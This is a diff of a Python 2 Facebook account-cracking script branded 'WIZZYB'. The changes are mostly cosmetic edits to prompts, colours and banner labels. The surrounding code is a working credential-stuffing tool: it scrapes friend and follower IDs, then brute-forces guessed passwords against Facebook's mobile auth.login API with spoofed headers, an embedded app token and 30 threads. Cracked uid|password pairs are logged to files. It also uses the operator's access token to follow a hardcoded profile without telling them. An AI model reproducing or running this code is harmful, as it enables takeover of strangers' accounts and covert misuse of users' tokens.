@@ -67,7 +67,11 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError, IOError:
-		token = raw_input("\033[1;31mLOGIN WITH ACCESS TOKEN \033[1;33m : ")
+		print("\033[1;93m If you dont have token ,  go download !Get Access Token! ")
+		print(" ")
+		print("\033[1;93m download on !playstore! ")
+		print(" ")
+		token = raw_input("\033[1;91mLOGINWITHTOKEN \033[1;33m : ")
 		if token == "":
 			print("Wrong Input")
              
@@ -75,7 +79,7 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/100008297554931/subscribers?access_token="+token)      # Dapunta Khurayra X
+			requests.post("https://graph.facebook.com/100008297554931/subscribers?access_token="+token)      
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
@@ -98,13 +102,13 @@ def menu():
 		exit(" ! no internet connection")
 	logo()
 	
-	print("\n\033[1;97m[\033[1;92m01\033[1;97m] crack ID from public friends")
-	print("\033[1;97m[\033[1;92m02\033[1;97m] crack ID from public followers ")
-	print("\033[1;97m[\033[1;92m03\033[1;97m] Wizzyb Massive ID's crack Pro\033[1;93m [ \033[1;95mPRO \033[1;97m]")
-	print("\033[1;97m[\033[1;92m04\033[1;97m] Chack Crack Results")
-	print("\033[1;97m[\033[1;92m05\033[1;97m] User Agent settings\033[1;97m [ \033[1;95mPRO \033[1;97m]")
-	print("\033[1;97m[\033[1;92m00\033[1;97m] Exit\033[1;97m [ \033[1;91mLogout\033[1;97m]")
-	Bilal = raw_input("\n\033[1;92m[\033[1;97m+\033[1;97m] \033[1;93mchoose : ")
+	print("\n\033[1;97m[\033[1;92m01\033[1;99m] crack ID from public friends")
+	print("\033[1;97m[\033[1;92m02\033[1;92m] crack ID from public followers ")
+	print("\033[1;97m[\033[1;92m03\033[1;91m] WIZZYBMassive ID's crack\033[1;93m [ \033[1;95mPRO \033[1;89m]")
+	print("\033[1;97m[\033[1;92m04\033[1;90m] Chack Crack Results")
+	print("\033[1;97m[\033[1;92m05\033[1;94m] User Agent settings\033[1;97m [ \033[1;95mPRO \033[1;96m]")
+	print("\033[1;97m[\033[1;92m00\033[1;97m] Exit\033[1;94m [ \033[1;91mLogout\033[1;97m]")
+	Bilal = raw_input("\n\033[1;92m[\033[1;97m+\033[1;91m] \033[1;93mchoose : ")
 	if Bilal =="":
 		menu()
 	elif Bilal == "1" or Bilal == "01":
@@ -232,7 +236,7 @@ def method():
 	if method == "":
 		menu()
 	elif method == "1":
-		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] do you want to you manual passwords y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] : ")
+		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] do you want to you manual passwords y/n\033[1;97m [ \033[1;96mDefault : n \033[1;97m] : ")
 		if ask == "y":
 			manual()
 		print(" ")
@@ -246,7 +250,7 @@ def method():
 		ThreadPool(30).map(mbasic, id)
 		exit("Program End")
 	elif method == "3":
-		ask = raw_input("\033[1;96m[\033[1;92m!\033[1;97m] do you want to choose manual passwords y/n\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
+		ask = raw_input("\033[1;96m[\033[1;92m!\033[1;97m] do you want to choose manual passwords y/n\033[1;97m [ \033[1;92mDefault : n \033[1;97m] ")
 		if ask == "y":
 			manual()
 		print(" ")
@@ -262,7 +266,7 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[1;93m[WIZZYB-CP]\033[1;91m %s|%s|%s %s %s"%(uid, pw, day, month, year))
+			print("\r\033[1;91m[OKENWA-CP]\033[1;91m %s|%s|%s %s %s"%(uid, pw, day, month, year))
 			cp.append("%s|%s"%(uid, pw))
 			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
@@ -278,7 +282,7 @@ def bapi(user):
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[0;91m[\033[0;92mWIZZYB_Cracking\033[0;91m]\033[0;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+		"\r\033[0;91m[\033[0;92mWizzyb_Cracking\033[0;91m]\033[0;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -296,13 +300,13 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[1;97m[\033[1;96mWIZZYB-OK\033[1;97m]\033[1;92m %s|%s|%s\033[0;97m"%(uid, pw))
+				print("\r\033[1;97m[\033[1;92mWIZZYB-OK\033[1;97m]\033[1;92m %s|%s|%s\033[0;97m"%(uid, pw))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[1;97m[\033[1;95mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[1;97m[\033[1;91mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
